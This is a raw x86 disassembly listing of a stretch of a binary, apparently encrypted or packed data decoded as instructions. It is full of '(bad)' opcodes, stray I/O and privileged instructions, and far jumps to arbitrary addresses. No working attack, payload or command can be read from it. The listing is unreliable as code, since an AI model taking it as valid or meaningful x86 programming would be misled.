  404046:	inc    ecx
  404047:	jge    0x4040c8
  404049:	cdq    
  40404a:	cmp    eax,DWORD PTR [edx-0x60]
  40404d:	cmp    al,0x62
  40404f:	mov    al,BYTE PTR [ecx]
  404051:	inc    edi
  404052:	js     0x4040a6
  404054:	(bad)  
  404055:	xlat   BYTE PTR ds:[ebx]
  404056:	lds    edx,FWORD PTR [edi+esi*8+0x3999f91d]
  40405d:	mov    cl,0x78
  40405f:	test   eax,0x6d778588
  404064:	lods   al,BYTE PTR ds:[esi]
  404065:	mov    DWORD PTR [ecx+0x36],esp
  404068:	push   cs
  404069:	dec    esi
  40406a:	and    BYTE PTR [esi-0x70],0xc1
  40406e:	icebp  
  40406f:	sbb    eax,0x5faab1cd
  404074:	retf   
  404075:	out    dx,al
  404076:	(bad)  
  404077:	adc    eax,0x8108c0aa
  40407c:	fwait
  40407d:	rol    DWORD PTR [ebx+0x626a4c3b],cl
  404083:	cmp    esi,DWORD PTR [eax+0x4f]
  404086:	or     ebx,DWORD PTR gs:[ecx+0x44]
  40408a:	(bad)
  40408d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408e:	adc    ah,BYTE PTR [ecx+0x3f]
  404091:	dec    ecx
  404092:	leave  
  404093:	sub    esp,DWORD PTR [ebp-0x12431049]
  404099:	sub    BYTE PTR [eax],bh
  40409b:	fsub   st,st(4)
  40409d:	or     al,0xf1
  40409f:	inc    eax
  4040a0:	add    DWORD PTR [edi-0x6a807f5b],esi
  4040a6:	cwde   
  4040a7:	shr    edi,cl
  4040a9:	jbe    0x40406a
  4040ab:	(bad)  
  4040ac:	xchg   ebp,eax
  4040ad:	dec    ebp
  4040ae:	shl    DWORD PTR [edi+0xd],1
  4040b1:	(bad)  
  4040b2:	int    0x67
  4040b4:	jmp    0x4a6b:0x21ec8c86
  4040bb:	dec    esi
  4040bc:	adc    al,0xdc
  4040be:	cmp    esi,ecx
  4040c0:	lods   al,BYTE PTR ds:[esi]
  4040c1:	fmul   DWORD PTR [ecx+0x7d]
  4040c4:	gs int3 
  4040c6:	pop    es
  4040c7:	xchg   DWORD PTR [ebx-0x32bde58c],esp
  4040cd:	gs xor ebp,edx
  4040d0:	mov    ah,0x5a
  4040d2:	or     DWORD PTR [ebx],edi
  4040d4:	dec    eax
  4040d5:	ss ret 0x29d4
  4040d9:	push   ebx
  4040da:	or     BYTE PTR [esi-0x6e],cl
  4040dd:	jns    0x404152
  4040df:	push   cs
  4040e0:	(bad)  
  4040e1:	jp     0x404134
  4040e3:	mov    al,ds:0x92b25ac2
  4040e8:	std    
  4040e9:	add    DWORD PTR [edx-0x1843d7d],0xfffffff6
  4040f0:	mov    bh,BYTE PTR [eax]
  4040f2:	lock xchg esp,eax
  4040f4:	ds stc 
  4040f6:	adc    eax,DWORD PTR [eax+eax*8]
  4040f9:	dec    edx
  4040fa:	arpl   WORD PTR [eax+0x4bb003a6],bp
  404100:	mov    ebp,0x33f1ed7d
  404105:	loopne 0x4040c9
  404107:	(bad)  
  404109:	mov    dl,0xb8
  40410b:	inc    ebx
  40410c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40410d:	mov    cl,0xb6
  40410f:	gs ja  0x4040f0
  404112:	outs   dx,BYTE PTR ds:[esi]
  404113:	or     BYTE PTR [esi-0x55dd286a],dl
  404119:	cli    
  40411a:	int    0xf0
  40411c:	call   0x4e227497
  404121:	(bad)  
  404123:	inc    eax
  404124:	sub    al,0x11
  404126:	pop    edi
  404127:	xchg   esp,eax
  404128:	inc    ecx
  404129:	xor    al,0xd8
  40412b:	std    
  40412c:	addr16 sbb dl,bl
  40412f:	or     BYTE PTR [esi-0x12],al
  404132:	xor    DWORD PTR [ebp-0x50],0x3eee2a41
  404139:	arpl   cx,bp
  40413b:	daa    
  40413c:	aaa    
  40413d:	mov    eax,0x14efd7bb
  404142:	sub    al,0xda
  404144:	lahf   
  404145:	rol    edi,0x7
  404148:	mov    eax,ds:0x233b50f6
  40414d:	mov    ecx,ds
  40414f:	ret    
  404150:	loope  0x404194
  404152:	mov    edx,0xbc53566e
  404157:	jge    0x4041b1
  404159:	outs   dx,BYTE PTR ds:[esi]
  40415a:	fist   WORD PTR [ebx]
  40415c:	outs   dx,BYTE PTR ds:[esi]
  40415d:	pushf  
  40415e:	fadd   DWORD PTR [esi+0x63]
  404161:	cmp    BYTE PTR [ecx],0xbc
  404164:	mov    ?,WORD PTR [esi]
  404166:	sbb    al,0x6f
  404168:	loope  0x404114
  40416a:	lods   al,BYTE PTR ds:[esi]
  40416b:	pushf  
  40416c:	loope  0x40414a
  40416e:	rcr    DWORD PTR ds:0xe6480bba,1
  404174:	adc    bl,0x2a
  404177:	xchg   edx,ecx
  404179:	dec    ebx
  40417a:	fidivr WORD PTR [ecx+0xa]
  40417d:	maskmovq mm4,(bad)
  40417e:	mul    DWORD PTR [ecx+eiz*4+0x128dedec]
  404185:	stos   DWORD PTR es:[edi],eax
  404186:	daa    
  404187:	jns    0x40413b
  404189:	xor    DWORD PTR gs:[ecx+0x7ab81a1d],eax
  404190:	pop    ss
  404191:	shr    DWORD PTR [ebp-0x3],cl
  404194:	int3   
  404195:	mov    edx,0xf9a0ec3
  40419a:	daa    
  40419b:	jge    0x404139
  40419d:	mov    eax,ds:0xdac1f263
  4041a2:	push   ebx
  4041a3:	sti    
  4041a4:	fistp  QWORD PTR ds:0xb7c1a0ba
  4041aa:	jp     0x4041aa
  4041ac:	icebp  
  4041ad:	loop   0x404180
  4041af:	(bad)  [ebx-0xb]
  4041b2:	(bad)  [eax+0x17557bac]
  4041b8:	push   0x3616a09a
  4041bd:	mov    ch,0x81
  4041c0:	in     eax,dx
  4041c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041c2:	lds    edi,FWORD PTR [ebx+0x7]
  4041c5:	test   DWORD PTR [ebp+0x74],esi
  4041c8:	retf   
  4041c9:	pop    edx
  4041ca:	std    
  4041cb:	xchg   ebp,eax
  4041cc:	sbb    BYTE PTR [esi+0x714f073f],0xab
  4041d3:	mov    ebp,0x1619dafa
  4041d8:	jmp    0x4041f1
  4041da:	(bad)  
  4041db:	cmp    DWORD PTR [eax-0x6885e91a],esi
  4041e1:	test   BYTE PTR [esp+ebp*2-0x10],dl
  4041e5:	xchg   BYTE PTR [esi],ch
  4041e7:	lods   al,BYTE PTR ds:[esi]
  4041e8:	sub    ecx,DWORD PTR [ebx-0x6f6d2f8f]
  4041ee:	dec    eax
  4041ef:	dec    ebp
  4041f0:	jl     0x4041e1
  4041f2:	xor    eax,0xcb901d75
  4041f7:	leave  
  4041f8:	cmp    eax,0x5b9accd9
  4041fd:	fisttp QWORD PTR [eax+0x6c91f305]
  404203:	push   0x377cc8a5
  404208:	dec    ebp
  404209:	xor    BYTE PTR [edx+ebx*1+0xd],cl
  40420d:	ficomp DWORD PTR cs:[esi-0x8adc04]
  404214:	sub    ebp,ebx
  404216:	ffree  st(0)
  404218:	jo     0x404211
  40421a:	cs xchg edi,eax
  40421c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421d:	mul    eax
  40421f:	mov    bl,0xe3
  404221:	in     eax,0xe0
  404223:	out    0x7b,eax
  404225:	scas   al,BYTE PTR es:[edi]
  404226:	ud1    edx,DWORD PTR ds:0xd67f13bf
  40422d:	mov    ebx,0xf151dad9
  404232:	xor    bl,BYTE PTR [edx]
  404234:	mov    al,0x82
  404236:	xchg   esp,eax
  404237:	mov    ebx,0x2bef9d09
  40423c:	mov    edi,0xbbd1c18d
  404241:	cmc    
  404242:	je     0x4041c4
  404244:	xchg   edx,eax
  404245:	or     eax,0x356094c4
  40424a:	cmp    ebx,ecx
  40424c:	push   esi
  40424d:	rcr    BYTE PTR [esi],0x8e
  404250:	sub    ebx,DWORD PTR [edx-0x28]
  404253:	pushf  
  404254:	stos   DWORD PTR es:[edi],eax
  404255:	shr    DWORD PTR [ebx-0x4feb32f8],cl
  40425b:	(bad)  [edi-0x7e9c314b]
  404261:	rcr    BYTE PTR [eax],cl
  404263:	inc    ebp
  404264:	(bad)  
  404265:	lahf   
  404266:	mov    cl,0xc3
  404268:	mov    edx,0x24ff73e2
  40426d:	inc    edx
  40426e:	test   DWORD PTR [eax],edi
  404270:	or     eax,0xc8e6593c
  404275:	call   0x650b:0x53c25cf8
  40427c:	xor    bh,BYTE PTR [edx-0x65]
  40427f:	adc    BYTE PTR [edi+0x606c1877],al
  404285:	stc    
  404286:	push   DWORD PTR [ecx-0x6c]
  404289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428a:	lods   al,BYTE PTR ds:[esi]
  40428b:	call   0xda5f:0xda3dcf9c
  404292:	lock mov ah,0x10
  404295:	dec    ebx
  404296:	pop    ds
  404297:	(bad)  
  404298:	mov    ch,0x7b
  40429a:	data16 jb 0x404263
  40429d:	in     eax,0x15
  40429f:	jae    0x4042f7
  4042a1:	scas   eax,DWORD PTR es:[edi]
  4042a2:	adc    DWORD PTR [eax],esi
  4042a4:	cdq    
  4042a5:	mov    ebp,0xff1fa9ef
  4042aa:	fs jo  0x4042c1
  4042ad:	fiadd  WORD PTR [esi-0x54a215fb]
  4042b3:	xlat   BYTE PTR ds:[ebx]
  4042b4:	jno    0x4042ee
  4042b6:	shl    edx,0x6a
  4042b9:	and    bh,BYTE PTR [esi-0x31]
  4042bc:	mov    ah,BYTE PTR [edi-0x3487df49]
  4042c2:	jo     0x404336
  4042c4:	push   ds
  4042c5:	xchg   edx,eax
  4042c6:	push   esi
  4042c7:	jns    0x40427b
  4042c9:	in     al,0x7e
  4042cb:	addr16 cwde 
  4042cd:	xor    eax,0x233068a9
  4042d2:	jle    0x40426d
  4042d4:	mov    edi,DWORD PTR [eax+0x269ff8bc]
  4042da:	push   ds
  4042db:	loop   0x404328
  4042dd:	lahf   
  4042de:	icebp  
  4042df:	inc    edx
  4042e0:	xchg   DWORD PTR [esi],esp
  4042e2:	aam    0x93
  4042e4:	jecxz  0x404351
  4042e6:	fild   QWORD PTR ds:0xfb11a272
  4042ec:	sbb    eax,0xfe9e78b6
  4042f1:	push   ds
  4042f2:	lods   eax,DWORD PTR ds:[esi]
  4042f3:	dec    esi
  4042f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f6:	or     DWORD PTR [esi+0x6f],edx
  4042f9:	jl     0x404337
  4042fb:	out    dx,eax
  4042fc:	mov    ch,0xa7
  4042fe:	ds jl  0x40428f
  404301:	jp     0x404296
  404303:	mov    cl,0x30
  404305:	mul    DWORD PTR [edx]
  404307:	mov    dh,0xcc
  404309:	rol    cl,0xbf
  40430c:	in     al,0xfb
  40430e:	test   DWORD PTR [edx+0x7a5ffdd9],0xc735c4b7
  404318:	inc    esi
  404319:	inc    esi
  40431a:	mov    al,BYTE PTR [edi+0x4]
  40431d:	push   ss
  40431e:	and    edi,DWORD PTR [esi+0x34]
  404321:	push   eax
  404322:	into   
  404323:	imul   eax,DWORD PTR [esi+0xc],0x2f
  404327:	jnp    0x4042d7
  404329:	repnz xor bl,BYTE PTR [eax+ebp*4+0x47]
  40432e:	mov    ds,WORD PTR [edx-0x11788a77]
  404334:	sbb    esp,DWORD PTR [eax-0x5d1e586]
  40433a:	sub    cl,BYTE PTR [ecx-0x29]
  40433d:	(bad)  
  40433e:	iret   
  40433f:	xchg   cl,dl
  404341:	jmp    0xc8931a93
  404346:	xor    BYTE PTR [eax-0x3562dbcb],cl
  40434c:	hlt    
  40434d:	cdq    
  40434e:	sbb    dh,0x1c
  404351:	imul   edi,ebp,0x4e48db52
  404357:	mov    al,0xb
  404359:	addr16 jge 0x40438f
  40435c:	pop    esp
  40435d:	jb     0x40430a
  40435f:	fisubr DWORD PTR [ecx*4+0x56540b35]
  404366:	(bad)  
  404367:	jmp    0x284cc7f7
  40436c:	js     0x40439d
  40436e:	adc    ah,bh
  404370:	cmp    esp,DWORD PTR ds:0xf378c9d9
  404376:	or     dh,BYTE PTR [edx-0x34]
  404379:	mov    dh,BYTE PTR [ebp+0x2a]
  40437c:	pop    ss
  40437d:	xchg   ebp,eax
  40437e:	int3   
  40437f:	lds    ebp,FWORD PTR [ecx-0x2b37b373]
  404385:	jbe    0x404342
  404387:	push   ebp
  404388:	adc    DWORD PTR [ecx-0x1639db50],ecx
  40438e:	mov    WORD PTR [ecx+edi*1],gs
  404391:	inc    ebp
  404392:	sub    BYTE PTR [ecx-0x39],0xbe
  404396:	xlat   BYTE PTR ds:[ebx]
  404397:	mov    dh,0xb2
  404399:	cdq    
  40439a:	inc    edx
  40439b:	mov    ch,0x98
  40439d:	(bad)  
  40439e:	loope  0x4043ac
  4043a0:	arpl   WORD PTR [esi+0x681ce0c3],bx
  4043a6:	push   ebp
  4043a7:	mov    ds:0x6f3e4f38,al
  4043ac:	aad    0x48
  4043ae:	test   DWORD PTR [edx+0x1ea3a697],0x69b171f5
  4043b8:	push   esi
  4043b9:	loopne 0x4043f7
  4043bb:	cmc    
  4043bc:	call   0xfb56:0xf0853c15
  4043c3:	(bad)  
  4043c4:	les    edi,FWORD PTR [ecx+0x22c928b4]
  4043ca:	fwait
  4043cb:	outs   dx,BYTE PTR ds:[esi]
  4043cc:	sahf   
  4043cd:	cmp    ebp,0xffffffcb
  4043d0:	sar    DWORD PTR [ebp+0x351e0267],cl
  4043d6:	xor    cl,BYTE PTR [edx]
  4043d8:	jmp    0x150544c
  4043dd:	push   esi
  4043de:	stos   BYTE PTR es:[edi],al
  4043df:	mov    al,ds:0x6aca4817
  4043e4:	daa    
  4043e5:	sbb    BYTE PTR [edx-0x13],bl
  4043e8:	inc    ebx
  4043e9:	push   edi
  4043ea:	mov    WORD PTR [edi],ds
  4043ec:	mov    WORD PTR [ebx-0x731cb9f0],fs
  4043f2:	sub    bl,BYTE PTR [edx+0x30]
  4043f5:	aas    
  4043f6:	ss adc edx,edx
  4043f9:	inc    BYTE PTR [ebp-0xcf534d8]
  4043ff:	es cmp al,0x8c
  404402:	shl    esi,cl
  404404:	or     BYTE PTR [ebp+0x2a3f968e],dl
  40440a:	xchg   DWORD PTR [eax+0x43],edx
  40440d:	pop    ss
  40440e:	add    DWORD PTR gs:[edx+eax*4+0x33ed1636],ecx
  404416:	jp     0x40445e
  404418:	or     DWORD PTR [ebx+0x73],ebx
  40441b:	add    al,0x65
  40441d:	in     al,dx
  40441e:	dec    eax
  40441f:	dec    esp
  404420:	push   ss
  404421:	cmp    esi,0xffffffb9
  404424:	mov    ecx,0xe1a64758
  404429:	pop    esp
  40442a:	imul   DWORD PTR [edi-0x76a2b5a6]
  404430:	xchg   dh,bh
  404432:	imul   ecx,DWORD PTR [edi-0x65],0x6d3e9429
  404439:	inc    ebx
  40443a:	enter  0x7851,0x56
  40443e:	mov    cl,0xb
  404440:	hlt    
  404441:	aad    0xc4
  404443:	jb     0x404434
  404445:	mov    edi,DWORD PTR [ebx]
  404447:	hlt    
  404448:	cmc    
  404449:	inc    ebp
  40444a:	leave  
  40444b:	mov    cl,0x3d
  40444d:	ins    DWORD PTR es:[edi],dx
  40444e:	xchg   ebx,eax
  40444f:	inc    esi
  404450:	call   0x160c071
  404455:	inc    esi
  404456:	bound  ebx,QWORD PTR [esi]
  404458:	xchg   edi,eax
  404459:	test   eax,0xff9ef294
  40445e:	inc    edx
  40445f:	sub    al,0x9
  404461:	push   0x251f72bf
  404466:	mov    ecx,0x327e9bf5
  40446b:	stos   BYTE PTR es:[edi],al
  40446c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40446d:	or     DWORD PTR [edx-0x7b6a57f2],0xe4a20259
  404477:	pop    edx
  404478:	jae    0x404496
  40447a:	jg     0x404499
  40447c:	inc    esp
  40447d:	mov    esp,edx
  40447f:	push   cs
  404480:	mov    ecx,0x7cbf1b96
  404485:	xchg   esi,eax
  404486:	xchg   esi,eax
  404487:	lock mov BYTE PTR [edx],cl
  40448a:	iret   
  40448b:	call   0x9300:0x88a74c94
  404492:	clc    
  404493:	in     eax,dx
  404494:	stos   BYTE PTR es:[edi],al
  404495:	(bad)  
  404496:	cmp    ah,BYTE PTR [edx+ecx*2-0xb8b8a88]
  40449d:	repz lahf 
  40449f:	(bad)  
  4044a0:	mov    ah,0x3d
  4044a2:	(bad)  
  4044a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a4:	cmp    edx,0x5b275f5
  4044aa:	jecxz  0x4044d8
  4044ac:	aam    0x94
  4044ae:	ds scas eax,DWORD PTR es:[edi]
  4044b0:	pusha  
  4044b1:	ins    BYTE PTR es:[edi],dx
  4044b2:	push   ebx
  4044b3:	std    
  4044b4:	out    0x32,eax
  4044b6:	jg     0x404505
  4044b8:	add    eax,0x507f510a
  4044bd:	mov    edx,0x453b296
  4044c2:	add    cl,bh
  4044c4:	mov    bh,0xb6
  4044c6:	in     al,dx
  4044c7:	sbb    BYTE PTR [ebx+0x3876dc5b],dh
  4044cd:	(bad)  
  4044ce:	mov    eax,0xe9d996b
  4044d3:	push   0x5a06533f
  4044d8:	sub    ch,bh
  4044da:	call   0xd3568dcf
  4044df:	(bad)  
  4044e0:	push   edi
  4044e1:	add    al,0xab
  4044e3:	popa   
  4044e4:	sbb    BYTE PTR [eax+ebx*1+0x55],bh
  4044e8:	add    BYTE PTR [ebx-0x748b5060],dh
  4044ee:	lock xor ebp,DWORD PTR [esi]
  4044f1:	not    DWORD PTR [ebx]
  4044f3:	mov    ah,0xd0
  4044f5:	mov    bh,0xad
  4044f7:	out    0x49,al
  4044f9:	loope  0x404555
  4044fb:	add    BYTE PTR [ecx],al
  4044fd:	mov    dl,0xbd
  4044ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404500:	mov    ebp,0xeddf956d
  404505:	and    ebp,eax
  404507:	push   0x386c7b20
  40450c:	jge    0x4044ad
  40450e:	cli    
  40450f:	cmp    DWORD PTR [eax-0x4e88560],ebp
  404515:	jl     0x4044a2
  404517:	and    esi,DWORD PTR [edi+0x27]
  40451a:	repz (bad) 
  40451c:	xlat   BYTE PTR ds:[ebx]
  40451d:	inc    edi
  40451e:	loope  0x404539
  404520:	xchg   BYTE PTR ds:0x80f25584,dh
  404526:	aam    0xd7
  404528:	dec    edi
  404529:	hlt    
  40452a:	xchg   esp,eax
  40452b:	arpl   WORD PTR [edi-0x763a0207],ax
  404531:	(bad)  
  404532:	dec    edi
  404533:	in     al,dx
  404534:	outs   dx,BYTE PTR ds:[esi]
  404535:	jo     0x404509
  404537:	test   BYTE PTR [ebp-0x66],bh
  40453a:	in     al,dx
  40453b:	fisttp QWORD PTR [ecx+0x4a4ba754]
  404541:	not    DWORD PTR gs:[ebx+0x197ca9fa]
  404548:	add    eax,0x3dcd0930
  40454d:	and    esi,eax
  40454f:	or     edi,DWORD PTR [ecx+0x4cfdb152]
  404555:	xchg   ebp,eax
  404556:	pop    ebp
  404557:	mov    BYTE PTR [ebx-0xc],bh
  40455a:	sub    dl,dl
  40455c:	mov    edi,0xd0607c83
  404561:	idiv   BYTE PTR [edi-0x510da9e]
  404567:	test   al,0x7c
  404569:	mov    edx,0x1e2ee033
  40456e:	idiv   DWORD PTR ss:[ecx+0x7d447590]
  404575:	shl    ebx,1
  404577:	mov    ds:0x9c234d93,al
  40457c:	fwait
  40457d:	add    dl,BYTE PTR [ecx]
  40457f:	cmp    esp,ebp
  404581:	sbb    DWORD PTR [ebx-0x7d19b356],esi
  404587:	in     eax,dx
  404588:	sahf   
  404589:	aaa    
  40458a:	xor    eax,0xc372594e
  40458f:	push   ss
  404590:	hlt    
  404591:	pushf  
  404592:	pop    ebx
  404593:	ins    BYTE PTR es:[edi],dx
  404594:	mov    edi,DWORD PTR [ebp*2-0x6e5c331e]
  40459b:	xor    ecx,ebx
  40459d:	sub    eax,0xdde1e842
  4045a2:	stos   DWORD PTR es:[edi],eax
  4045a3:	pop    es
  4045a4:	pop    ebp
  4045a5:	push   esi
  4045a6:	mov    eax,0x23b6e0c3
  4045ab:	push   eax
  4045ac:	shl    BYTE PTR [ecx],0xf8
  4045af:	repnz test DWORD PTR [edi+eiz*4+0x56ee5bc4],eax
  4045b7:	je     0x40453e
  4045b9:	push   ebp
  4045ba:	mov    DWORD PTR [ecx-0x2959b93d],ecx
  4045c0:	leave  
  4045c1:	cmp    DWORD PTR [eax-0x6],edx
  4045c4:	rcr    BYTE PTR [edi+0x7fa7a821],1
  4045ca:	mov    ebx,0xb4a4ff2
  4045cf:	inc    eax
  4045d0:	jnp    0x4045e5
  4045d2:	xchg   esi,eax
  4045d3:	rcl    bl,1
  4045d5:	and    BYTE PTR [eax-0x2aeb69f0],0x93
  4045dc:	arpl   sp,ax
  4045de:	imul   ebx,esp,0x2f
  4045e1:	jmp    0xcdf45703
  4045e6:	ja     0x404570
  4045e8:	(bad)  
  4045e9:	in     eax,0x0
  4045eb:	retf   
  4045ec:	rol    BYTE PTR [edi+0x63046b00],1
  4045f2:	mov    dl,dl
  4045f4:	call   0xa997:0xc758aa8
  4045fb:	mov    eax,ds:0x8dd83c05
  404600:	push   eax
  404601:	mov    eax,ds:0x4390bb30
  404606:	jle    0x404648
  404608:	xchg   DWORD PTR [ecx],esp
  40460a:	fs push ss
  40460c:	clc    
  40460d:	fimul  DWORD PTR [edi]
  40460f:	(bad)  
  404610:	aaa    
  404611:	lahf   
  404612:	inc    esp
  404614:	push   edx
  404615:	sub    al,0x46
  404617:	je     0x40464c
  404619:	sbb    BYTE PTR [ebx-0x59],ch
  40461c:	fdivr  st,st(1)
  40461e:	fild   WORD PTR [ebp-0x5a05946]
  404624:	cmp    eax,0xda937b54
  404629:	sub    DWORD PTR [eax],0xffffffd8
  40462c:	sub    al,0x76
  40462e:	sub    ecx,ebp
  404630:	repnz xlat BYTE PTR ds:[ebx]
  404632:	out    0x1d,al
  404634:	pop    edi
  404635:	test   al,0x37
  404637:	outs   dx,DWORD PTR ds:[esi]
  404638:	jne    0x404630
  40463a:	pop    edx
  40463b:	cmp    bh,BYTE PTR ds:0x1343c17b
  404641:	daa    
  404642:	mov    ds:0xd0a09380,al
  404647:	loop   0x40466c
  404649:	(bad)  
  40464a:	ret    
  40464b:	out    0xaa,al
  40464d:	push   es
  40464e:	pop    es
  40464f:	xchg   edi,eax
  404650:	mov    esp,?
  404652:	xchg   edx,eax
  404653:	jecxz  0x4045e7
  404655:	sbb    ch,BYTE PTR [edi+0x2472bad1]
  40465b:	js     0x404698
  40465d:	in     al,0x96
  40465f:	(bad)  
  404660:	push   0x125373f8
  404665:	push   ss
  404666:	pop    edx
  404667:	mov    dl,dh
  404669:	push   ebp
  40466a:	jge    0x4046cc
  40466c:	icebp  
  40466d:	into   
  40466e:	xchg   esi,eax
  40466f:	add    eax,0x4dcdace7
  404674:	jmp    0xda8a:0x5dcbc207
  40467b:	arpl   WORD PTR [esi-0x1a6d764f],ax
  404681:	dec    ebx
  404682:	push   0x5c
  404684:	int3   
  404685:	and    DWORD PTR ds:0xacfd028f,ebp
  40468b:	mul    DWORD PTR [edx]
  40468d:	cdq    
  40468e:	aad    0xb1
  404690:	imul   ecx,ecx,0xffffffa3
  404693:	(bad)  
  404694:	adc    BYTE PTR [ebx],dh
  404696:	mov    esi,0x22d91f1
  40469b:	xchg   ebx,eax
  40469c:	mov    edi,0xb4f59c51
  4046a1:	mov    esp,0xb0ddfa3e
  4046a6:	pop    eax
  4046a7:	mov    ebp,0xe9c7a498
  4046ac:	fcos   
  4046ae:	jl     0x4046bf
  4046b0:	(bad)  [ebp-0x54]
  4046b3:	cli    
  4046b4:	xor    BYTE PTR [ebx],cl
  4046b6:	jnp    0x40466b
  4046b8:	pop    ebx
  4046b9:	dec    esp
  4046ba:	pop    ds
  4046bb:	mov    BYTE PTR [ecx+0x5219125e],ah
  4046c1:	dec    edx
  4046c2:	inc    edi
  4046c3:	push   eax
  4046c4:	inc    ebx
  4046c5:	addr16 test eax,0x70b3da40
  4046cb:	imul   esi,DWORD PTR [ebx+0x51],0xffffffb1
  4046cf:	dec    ebx
  4046d0:	imul   ebx,DWORD PTR [esp+ebx*1],0x2e
  4046d4:	sar    DWORD PTR [edx],cl
  4046d6:	pop    ss
  4046d7:	sbb    ebx,esi
  4046d9:	xor    ah,BYTE PTR [edx+0x1e2b0140]
  4046df:	adc    esp,edx
  4046e1:	outs   dx,BYTE PTR ds:[esi]
  4046e2:	int3   
  4046e3:	fnstsw WORD PTR [ebx-0x33]
  4046e6:	fs add al,0x1f
  4046e9:	fnstcw WORD PTR [edi-0x54841794]
  4046ef:	xchg   edi,eax
  4046f0:	xchg   ebp,eax
  4046f1:	push   0x57f6c656
  4046f6:	xchg   ebp,eax
  4046f7:	sbb    BYTE PTR [edi-0x80],ah
  4046fa:	loopne 0x4046af
  4046fc:	jl     0x40469b
  4046fe:	mov    al,ds:0x4e6e17e1
  404703:	mov    edi,0x84e88723
  404708:	dec    esi
  404709:	sar    BYTE PTR [ebx],1
  40470b:	jle    0x4046d5
  40470d:	fdivr  DWORD PTR [esi+0x5ac17752]
  404713:	jge    0x40469c
  404715:	int3   
  404716:	dec    ebx
  404717:	pusha  
  404718:	stos   DWORD PTR es:[edi],eax
  404719:	loop   0x404704
  40471b:	mov    ds,WORD PTR [eax-0x266348a6]
  404721:	and    ch,0x3a
  404724:	push   DWORD PTR [eax+edi*1]
  404727:	push   ss
  404728:	mov    edx,0x5cf8d0d
  40472d:	popf   
  40472e:	repz dec esi
  404730:	mov    ch,0x60
  404732:	sub    DWORD PTR [ecx-0x4d76c5fb],esi
  404738:	hlt    
  404739:	mov    esi,0x834c5d81
  40473e:	inc    ecx
  40473f:	cpuid  
  404741:	xchg   edx,eax
  404742:	adc    eax,0xbf367922
  404747:	xchg   DWORD PTR [edx+ecx*2],ebx
  40474a:	cmp    bh,bl
  40474c:	cmp    DWORD PTR [ebx-0x3b580051],edx
  404752:	jae    0x404766
  404754:	leave  
  404755:	inc    edi
  404756:	xchg   ebx,eax
  404757:	dec    BYTE PTR [ebx]
  404759:	pop    es
  40475a:	stos   DWORD PTR es:[edi],eax
  40475b:	popf   
  40475c:	inc    ebp
  40475d:	jb     0x40470e
  40475f:	jecxz  0x404715
  404761:	push   ebx
  404762:	idiv   BYTE PTR [ecx-0x36]
  404765:	loope  0x40474f
  404767:	cmp    BYTE PTR [ebp-0x75770915],bh
  40476d:	inc    esi
  40476e:	fsubr  DWORD PTR [eax+edi*8]
  404771:	mov    ds:0x1942213e,eax
  404776:	xchg   edx,eax
  404777:	xchg   edx,eax
  404778:	jge    0x40471e
  40477a:	mov    fs,WORD PTR [ebx+0x7a]
  40477d:	cmc    
  40477e:	ret    
  40477f:	scas   eax,DWORD PTR es:[edi]
  404780:	loop   0x40473a
  404782:	mov    bh,0x83
  404784:	mov    ecx,0x516fced8
  404789:	and    DWORD PTR [eax-0x58],0xa53aea8
  404790:	aam    0xfb
  404792:	adc    edx,DWORD PTR [eax]
  404794:	sbb    esp,eax
  404796:	loop   0x404718
  404798:	out    dx,eax
  404799:	sub    eax,0x2a7df977
  40479e:	sub    esp,0x68
  4047a1:	fist   WORD PTR [esi+0x7ec0a090]
  4047a7:	xchg   BYTE PTR [ebx+0x7b],cl
  4047aa:	or     esp,DWORD PTR [edi]
  4047ac:	daa    
  4047ad:	pusha  
  4047ae:	loop   0x4047df
  4047b0:	push   bp
  4047b2:	jno    0x40482f
  4047b4:	mov    eax,0x459fce67
  4047b9:	pop    ds
  4047ba:	sbb    eax,0xf5661f9f
  4047bf:	add    DWORD PTR [edx+eax*1],esp
  4047c2:	cmp    al,0xc4
  4047c4:	mov    al,0xba
  4047c6:	xor    ah,BYTE PTR [eax]
  4047c8:	sbb    cl,al
  4047ca:	and    dh,BYTE PTR [edi+0x47412db]
  4047d0:	inc    edx
  4047d1:	sar    DWORD PTR [edi],cl
  4047d3:	pop    ds
  4047d4:	cs or  eax,0x3bb5852f
  4047da:	call   0xf0714ca4
  4047df:	out    0x7,al
  4047e1:	int3   
  4047e2:	fs mov edx,0x70288310
  4047e8:	ret    
  4047e9:	adc    DWORD PTR ds:0x10ebe224,ebx
  4047ef:	sub    bp,si
  4047f2:	pop    esi
  4047f3:	xchg   BYTE PTR [edi-0x3d09db7c],ch
  4047f9:	aam    0xaf
  4047fb:	fdivr  DWORD PTR [ebp-0x4e29bb08]
  404801:	sbb    BYTE PTR gs:[edi],dl
  404804:	(bad)  
  404805:	icebp  
  404806:	cmp    al,bh
  404808:	lods   eax,DWORD PTR ds:[esi]
  404809:	adc    ebx,DWORD PTR [ecx-0x50]
  40480c:	sub    al,BYTE PTR [ecx-0x6e8d45d4]
  404812:	push   0xffffff82
  404814:	adc    BYTE PTR [ebx+eiz*8-0x4ee64fc6],0x8a
  40481c:	xchg   esp,eax
  40481d:	ror    DWORD PTR [esi-0x12138da5],0x22
  404824:	push   0xfaec1b7d
  404829:	icebp  
  40482a:	xor    al,0xff
  40482c:	sbb    ah,al
  40482e:	dec    esp
  40482f:	mov    esp,0x6b41acff
  404834:	aad    0xd1
  404836:	push   esp
  404837:	jmp    0x404846
  404839:	sbb    al,0xc3
  40483b:	out    dx,eax
  40483c:	inc    ebx
  40483d:	mov    edi,0xd948554a
  404842:	loopne 0x404861
  404844:	lock xchg edx,eax
  404846:	push   ecx
  404847:	pop    eax
  404848:	aad    0x8e
  40484a:	xlat   BYTE PTR ds:[ebx]
  40484b:	push   ecx
  40484c:	xchg   ebp,eax
  40484d:	mov    ebp,0xaa5c716e
  404852:	mul    BYTE PTR [ebp+0x45c13aec]
  404858:	mov    DWORD PTR [ecx+ebp*2],edi
  40485b:	jg     0x404808
  40485d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485e:	dec    DWORD PTR ds:0x9334ca1b
